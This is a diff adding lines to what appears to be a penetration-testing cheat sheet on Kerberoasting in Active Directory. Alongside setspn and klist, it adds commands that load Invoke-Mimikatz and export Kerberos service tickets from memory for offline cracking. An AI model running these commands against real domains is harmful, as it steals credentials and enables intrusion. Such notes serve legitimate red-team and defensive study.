@@ -152,6 +152,12 @@ setspn.exe -T $DOMAIN.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-
 
 # List kerberos tickets in memory
 klist
+
+# Import the module in powershell
+. .\Invoke-Mimikatz.ps1
+
+# extract the tgs tickets from memory
+Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 {% endcode %}
 
